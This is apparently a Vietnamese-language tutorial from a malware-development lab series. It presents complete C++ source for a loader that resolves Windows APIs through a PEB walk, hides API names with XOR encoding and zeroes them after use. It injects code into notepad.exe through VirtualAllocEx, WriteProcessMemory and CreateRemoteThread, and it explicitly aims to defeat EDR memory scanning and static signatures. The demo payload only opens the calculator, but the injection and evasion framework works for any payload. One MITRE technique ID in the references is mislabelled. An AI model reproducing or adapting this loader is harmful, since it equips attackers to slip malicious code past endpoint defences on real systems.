
---

# 📝 [PE 18] PEB Walk and APIs Obfuscation (Cross-Process Hybrid Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**PEB Walk combined with API Obfuscation (Giải thuật phân giải ký hiệu động kết hợp mật mã hóa chuỗi cấu trúc)** đại diện cho mô hình phòng thủ đa lớp (Layered Defensive Bypass) ở phân hệ tầng sâu, thuộc nhóm kỹ thuật **Né tránh toàn diện phân tích tĩnh và dấu vết bộ nhớ ảo (Static/Memory Anti-Forensics Hybrid Evasion)**.

Nếu Loader chỉ áp dụng giải thuật PEB Walk đơn thuần (`PE 17`), các chuỗi văn bản thuần túy (Plain-text Strings) dùng để so khớp tên hàm vẫn hiện diện lọt lòng trong phân đoạn `.rdata` trên ổ đĩa hoặc để lộ trên bộ nhớ RAM. Các phân hệ trinh sát động của EDR (như Memory Dumping / Call Stack Integrity Check) có thể bốc tách các tham số chuỗi này tại thời điểm runtime để dựng lại bản đồ hành vi của mã độc.

Dự án PE 18 hóa giải triệt để điểm thắt nút trinh sát này bằng việc thiết lập ma trận bảo an kép (Dual-Layer Evasion Matrix):

1. **Triệt tiêu hoàn toàn Import Address Table (IAT)**: Loại bỏ sự xuất hiện của các hàm can thiệp RAM nhạy cảm (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) khỏi cấu trúc bảng Import tĩnh của file PE.
2. **Mật mã hóa cấu trúc Stack-string (Runtime XOR Decryption)**: Toàn bộ tên của các hàm API hệ thống và chuỗi lệnh điều hướng đều bị băm nát bằng giải thuật mã hóa đối xứng XOR với một khóa bí mật (Secret Key) ngay tại thời điểm compile. Chuỗi tự thô chỉ được giải mã ngược trong một tích lửng thời gian ngắn lọt lòng bộ đệm Cache CPU rồi lập tức bị ghi đè xóa dấu vết (`Zeroing Overwrite`), khiến cho cả cơ chế quét tĩnh (Static Scan) lẫn quét RAM động (Memory Dumping) đều hoàn toàn bất lực.

### 🎯 Mục tiêu nghiên cứu:

* **Bẻ gãy cơ chế Memory Dumping**: Chống lại giải pháp phân tích hành vi động thông qua việc xóa sạch dấu vết chuỗi giải mã ngay sau khi sử dụng.
* **Làm chủ ma trận Evasion lai (Hybrid Evasion)**: Kết hợp nhuần nhuyễn giải thuật duyệt cấu trúc hệ thống `PEB Walk x64` và cơ chế giải mã động tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi Loader kích hoạt chiến dịch can thiệp bộ nhớ chéo tiến trình, dòng chảy CPU được hệ điều hành Windows Subsystem điều phối ngầm qua cấu trúc ma trận 4 giai đoạn logic kịch khung:

```
[__readgsqword(0x60) -> Trích xuất PEB Object]
       └──> [XOR Decryption: Giải mã chuỗi tên API ngay trên CPU Stack Frame]
                 └──> [Giải phẫu thủ công EAT -> Trích xuất địa chỉ API tuyệt đối]
                           └──> [RtlZeroMemory: Xóa chuỗi thô khoi RAM -> Kích nổ chéo tiến trình]

```

1. **Khởi động giải thuật PEB Walk**: Loader truy cập trực tiếp vào thanh ghi phân đoạn phần cứng **`GS:[0x60]`** trên kiến trúc x64 để bốc tách cấu trúc bản ghi PEB, từ đó duyệt qua danh sách liên kết vòng tròn `InLoadOrderModuleList` để trích xuất địa chỉ Base Address sống của `kernel32.dll` trên bộ nhớ ảo.
2. **Thức tỉnh chuỗi ký tự bằng XOR (Runtime Decryption)**: Các mảng dữ liệu Hex vô nghĩa trên Stack Frame được đưa qua hàm giải mã XOR cục bộ với một hằng số khóa định sẵn (`XOR_KEY = 0x5A`) để tái tạo lại tên hàm thô (ví dụ: `"VirtualAllocEx"`) ngay tại bộ nhớ Cache của CPU tại thời điểm chạy.
3. **Phẫu thuật EAT và xóa sạch chỉ dấu bộ nhớ**: Loader tự đóng vai trò là một trình nạp PE thủ công, duyệt qua mảng chứa tên hàm xuất bản (`AddressOfNames`) của `kernel32.dll` để so khớp chuỗi vừa được giải mã. Ngay khi tính toán và trích xuất thành công địa chỉ tuyệt đối của các hàm hệ thống, ta gán trực tiếp vào các mẫu cấu trúc hàm động (Dynamic Function Pointers) và lập tức phát lệnh triệu hồi **`RtlZeroMemory`** để ghi đè toàn bộ byte `0x00` lên các chuỗi text thô vừa sinh ra, triệt tiêu hoàn toàn khả năng bị đánh dấu bởi các bộ Memory Dump Scanners.
4. **Tiêm chéo và kích nổ tiến trình ký sinh**: Sử dụng các con trỏ hàm phân giải ngầm để thực hiện chuỗi hành vi can thiệp bộ nhớ chéo tiến trình sang mục tiêu vỏ bọc (đường dẫn được định vị động qua API hệ thống), hoàn tất chu kỳ sống phẳng sạch tuyệt đối.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – loại bỏ hoàn toàn các chuỗi gán cứng plain-text, thay thế bằng ma trận mảng mã hóa XOR bảo mật tối cao kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Cấu trúc Windows Internals thu gọn phục vụ bới RAM trên kiến trúc x64
typedef struct _UNICODE_STRING_REP {
    USHORT Length;   USHORT MaximumLength;   PWSTR Buffer;
} UNICODE_STRING_REP;

typedef struct _LDR_DATA_TABLE_ENTRY_INTERNAL {
    LIST_ENTRY InLoadOrderLinks;   BYTE Reserved1[16];   PVOID DllBase;   PVOID EntryPoint;
    ULONG SizeOfImage;   UNICODE_STRING_REP FullDllName;   UNICODE_STRING_REP BaseDllName;
} LDR_DATA_TABLE_ENTRY_INTERNAL, * PLDR_DATA_TABLE_ENTRY_INTERNAL;

typedef struct _PEB_LDR_DATA_REP {
    BYTE Reserved1[8];   PVOID Reserved2[3];   LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA_REP, * PPEB_LDR_DATA_REP;

typedef struct _PEB_REP {
    BYTE Reserved1[4];   PVOID Reserved2[1];   PVOID ImageBaseAddress;   PPEB_LDR_DATA_REP Ldr;
} PEB_REP, * PPEB_REP;

// Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;
    char szCommand[32];
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy chéo tiến trình mục tiêu
DWORD WINAPI RemoteObfuscatedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Khóa XOR đối xứng bảo an cấu trúc chuyên dụng
const char XOR_KEY = 0x5A;

// Hàm giải mã động chuỗi ký tự ngay tại runtime trên CPU Stack Frame
void XorCipher(char* data, size_t dataLen) {
    for (size_t i = 0; i < dataLen; i++) {
        data[i] ^= XOR_KEY;
    }
}

// Giải thuật so sánh chuỗi phẳng sạch thủ công, triệt tiêu sự phụ thuộc thư viện (CRT-Free)
bool CustomStrCmp(const char* str1, const char* str2) {
    while (*str1 && (*str1 == *str2)) { str1++; str2++; }
    return *(unsigned char*)str1 == *(unsigned char*)str2;
}

// Hàm PEB Walk: Tự bới RAM tìm Base Address của thư viện DLL hệ thống qua thanh ghi GS
PVOID GetModuleBaseViaPEB(const wchar_t* dllName) {
    PPEB_REP pPeb = (PPEB_REP)__readgsqword(0x60); // Đọc trực tiếp GS:[0x60] trên kiến trúc x64 Windows
    PLDR_DATA_TABLE_ENTRY_INTERNAL pEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pPeb->Ldr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY_INTERNAL pFirst = pEntry;

    do {
        if (pEntry->BaseDllName.Buffer != NULL) {
            if (_wcsicmp(pEntry->BaseDllName.Buffer, dllName) == 0) {
                return pEntry->DllBase;
            }
        }
        pEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pEntry->InLoadOrderLinks.Flink;
    } while (pEntry != pFirst);
    return NULL;
}

// Hàm giải phẫu Export Table thủ công để bốc trần địa chỉ hàm thô từ bộ nhớ RAM
PVOID GetExportAddressViaEAT(PVOID dllBase, const char* apiName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    
    if (exportDir.VirtualAddress == 0) return NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + exportDir.VirtualAddress);

    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBase + pExport->AddressOfNames);
    DWORD* pdwFuncs = (DWORD*)((DWORD_PTR)dllBase + pExport->AddressOfFunctions);
    WORD* pwOrds = (WORD*)((DWORD_PTR)dllBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((DWORD_PTR)dllBase + pdwNames[i]);
        if (CustomStrCmp(szName, apiName)) {
            return (PVOID)((DWORD_PTR)dllBase + pdwFuncs[pwOrds[i]]);
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 18: PEB WALK & APIs OBFUSCATION HYBRID" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);
    if (dwPID == 0) return EXIT_FAILURE;

    // Các chuỗi ký tự đã được XOR trước bằng Key 0x5A để triệt tiêu Signature chữ tĩnh hoàn toàn
    // "VirtualAllocEx" XOR 0x5A
    char encVirtualAllocEx[] = { 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x1F, 0x32, 0x00 };
    // "WriteProcessMemory" XOR 0x5A
    char encWriteProcessMemory[] = { 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x00 };
    // "CreateRemoteThread" XOR 0x5A
    char encCreateRemoteThread[] = { 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x08, 0x3F, 0x37, 0x35, 0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x00 };
    // "WinExec" XOR 0x5A
    char encWinExec[] = { 0x0D, 0x33, 0x34, 0x1F, 0x22, 0x3F, 0x39, 0x00 };

    // KÍCH NỔ GIẢI MÃ: Thức tỉnh chuỗi ký tự thô trong tích tắc ngay trên bộ đệm Cache CPU Stack
    XorCipher(encVirtualAllocEx, sizeof(encVirtualAllocEx) - 1);
    XorCipher(encWriteProcessMemory, sizeof(encWriteProcessMemory) - 1);
    XorCipher(encCreateRemoteThread, sizeof(encCreateRemoteThread) - 1);
    XorCipher(encWinExec, sizeof(encWinExec) - 1);

    // BƯỚC 1: Gọi giải thuật PEB Walk định vị thô bản đồ Kernel32 qua phần cứng CPU
    PVOID k32Base = GetModuleBaseViaPEB(L"kernel32.dll");
    if (!k32Base) return EXIT_FAILURE;

    // BƯỚC 2: Giải phẫu cấu trúc EAT trích xuất con trỏ hàm tuyệt đối thông qua chuỗi vừa giải mã
    pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetExportAddressViaEAT(k32Base, encVirtualAllocEx);
    pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetExportAddressViaEAT(k32Base, encWriteProcessMemory);
    pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetExportAddressViaEAT(k32Base, encCreateRemoteThread);
    fnWinExec DynamicWinExec = (fnWinExec)GetExportAddressViaEAT(k32Base, encWinExec);

    // BẢO AN PHÒNG THỦ: Lập tức xóa sạch chuỗi thô khỏi bộ nhớ RAM để chống các bộ Memory Scanners
    RtlZeroMemory(encVirtualAllocEx, sizeof(encVirtualAllocEx));
    RtlZeroMemory(encWriteProcessMemory, sizeof(encWriteProcessMemory));
    RtlZeroMemory(encCreateRemoteThread, sizeof(encCreateRemoteThread));

    if (!DynamicVirtualAllocEx || !DynamicWriteProcessMemory || !DynamicCreateRemoteThread || !DynamicWinExec) {
        std::cerr << "[-] Pha phan giai API bi nghen nghien thap Kernel!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Ma tran hoa giai hoan tat! Da xoa sach dau vet API tho khoi RAM." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 3: Cấp phát động thích ứng vừa khít cấu trúc (Zero Static Buffers)
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = DynamicVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    THREAD_DATA localData;
    localData.pWinExec = DynamicWinExec;
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm thực thi và cấu trúc tham số tuyệt đối vào lòng Notepad từ xa
    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteObfuscatedPayload, functionSize, NULL);
    DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);

    // BƯỚC 4: Kích nổ luồng từ xa bằng con trỏ hàm Native phân giải ngầm bảo an kịch khung
    std::cout << "[*] Dang dung luong an danh de khai hoa..." << std::endl;
    HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Remote Hybrid Injection Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    }

    // Giải phóng tài nguyên Handle bảo an
    CloseHandle(hProcess);
    std::cout << "\n[*] Nhan Enter de ket thuc chu ky song..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm cấu trúc file nhị phân hoàn tất bẻ gãy mọi chữ ký tĩnh, loại bỏ hoàn toàn sự phụ thuộc vào các tệp liên kết động CRT khi triển khai sang môi trường Lab sạch:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.

> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
> 

3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường Lab, sau đó thực thi tệp tin Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận giải mã động:

```powershell
PS C:\Workspace\x64\Release> .\PE18_PEB_Walk_APIs_Obfuscation.exe
====================================================
[*] PE 18: PEB WALK & APIs OBFUSCATION HYBRID
====================================================
[+] Ma tran hoa giai hoan tat! Da xoa sach dau vet API tho khoi RAM.
[*] Dang dung luong an danh de khai hoa...
[+] Remote Hybrid Injection Executed Successfully!

[*] Nhan Enter de ket thuc chu ky song...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm Hybrid Injection:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Forensics Analysis):

* Thuật toán bẻ khóa hoàn thành xuất sắc, ứng dụng Máy tính **`calc.exe` bật bung hiên ngang rực rỡ kịch trần kịch khung** tại runtime!
* Thực hiện cuộc khảo sát tĩnh tệp tin nhị phân bằng công cụ trinh sát chuyên sâu (như `PEstudio` hoặc `CFF Explorer`), **chỉ mục bảng Import Address Table (IAT) hoàn toàn trống rỗng**; đồng thời tính năng trích xuất ký tự tĩnh (`Strings detection`) hoàn toàn bị vô hiệu hóa do các từ khóa API nhạy cảm đã bị băm nát cấu trúc bằng mật mã hóa XOR. Do mảng chuỗi thô giải mã trên RAM bị Loader ghi đè byte rỗng `0x00` lập tức sau khi bốc tách con trỏ, Payload đạt độ ẩn mình lý tưởng trước các bộ quét RAM động, hoàn tất chu kỳ sống vô vết vô hình!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Subsystem Guide**: *Thread Environment Block (TEB) & GS Register Management on Windows x64* - Windows Architecture Reference.
* **Mật mã học ứng dụng trong Malware**: *Polymorphic and Obfuscated Code Generation via Symmetric XOR Ciphers* - Black Hat Research Papers.
* **EDR Bypass Methodologies**: *Defeating Memory Scanning and YARA Signature Matching via Runtime String Zeroing* - Defcon Conference Artifacts.
* **MITRE ATT&CK Framework**: *Defense Evasion: Obfuscated Files or Information (T1027)* & *Dynamic API Resolution (T1562)*.

---

